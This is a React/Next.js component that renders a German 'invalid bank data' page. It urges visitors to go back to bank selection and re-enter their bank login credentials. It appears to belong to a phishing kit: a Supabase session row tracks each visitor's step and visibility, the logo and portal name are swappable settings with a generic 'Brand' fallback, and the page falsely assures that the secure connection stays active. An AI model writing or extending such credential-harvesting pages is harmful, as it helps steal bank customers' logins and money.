"use client";

import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function InvalidBankClient({ sessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();

  const handleRetry = async () => {
    const supabase = createBrowserSupabaseClient();
    if (supabase) {
      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken" })
        .eq("id", sessionId);
    }
    window.location.replace("/banken"); // ⭐ FLASH YOK: href → replace
  };


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <div className="relative z-50 pak-page-shell min-h-screen flex-col overflow-hidden">
      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#DF0000]/10 blur-[120px]" />
      <div className="absolute bottom-[-12%] right-[-10%] h-[360px] w-[360px] rounded-full bg-[#FF453A]/10 blur-[110px]" />

      <main className="relative z-10 flex w-full flex-col items-center justify-start p-4 pt-0">
        {!sessionId ? (
          <div className="flex justify-center relative z-10 w-full">
            <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
              Ungueltiger Link.
            </p>
          </div>
        ) : (
          <div className="pak-form-card fade-in mx-auto w-full max-w-[720px]">
            <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-8 sm:pb-8 sm:pt-8">
              <div className="mx-auto flex w-full max-w-[520px] items-start justify-between gap-3">
                <div>
                  <h2 className="pak-form-title max-w-[11ch]">Ungueltige Bankdaten</h2>
                  <p className="pak-form-subtitle mt-2.5 max-w-[31rem]">
                    Die eingegebenen Daten konnten nicht verifiziert werden. Ueberpruefen Sie die Angaben und versuchen Sie es erneut.
                  </p>
                </div>
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="mx-auto mt-5 flex w-full max-w-[520px] flex-col items-center rounded-[24px] border border-[#FF453A]/30 bg-[radial-gradient(circle_at_top,rgba(255,69,58,0.18),transparent_55%),linear-gradient(180deg,rgba(30,12,12,0.96),rgba(14,10,10,0.98))] px-5 py-6 text-center shadow-[inset_0_1px_0_rgba(255,69,58,0.08)] sm:px-6 sm:py-7">
                <div className="relative mb-4 flex h-20 w-20 items-center justify-center sm:h-24 sm:w-24">
                  <div className="absolute inset-0 rounded-full border border-[#FF453A]/20" />
                  <div className="absolute inset-[10px] rounded-full border border-[#DF0000]/20" />
                  <div className="absolute inset-[16px] rounded-full bg-[#DF0000]/10 blur-md" />
                  <div className="rounded-full border border-[#FF453A]/30 bg-[#DF0000]/10 p-3 sm:p-4">
                    <svg className="h-8 w-8 text-[#FF453A] sm:h-10 sm:w-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                  </div>
                </div>

                <p className="mb-6 max-w-[31rem] text-sm font-medium leading-6 text-white/82 sm:text-[0.95rem]">
                  Kehren Sie zur Bankauswahl zurueck und geben Sie Ihre Daten erneut ein. Stellen Sie sicher, dass die Zugangsdaten genau zu Ihrer Bank passen.
                </p>

                <button
                  onClick={() => void handleRetry()}
                  className="pak-form-button min-h-[3.65rem] w-full max-w-[22rem] px-6 text-lg"
                >
                  Erneut versuchen
                </button>

                <div className="mt-5 pak-form-security justify-center text-center">
                  <svg className="h-8 w-8 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>Sichere Verbindung bleibt aktiv</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
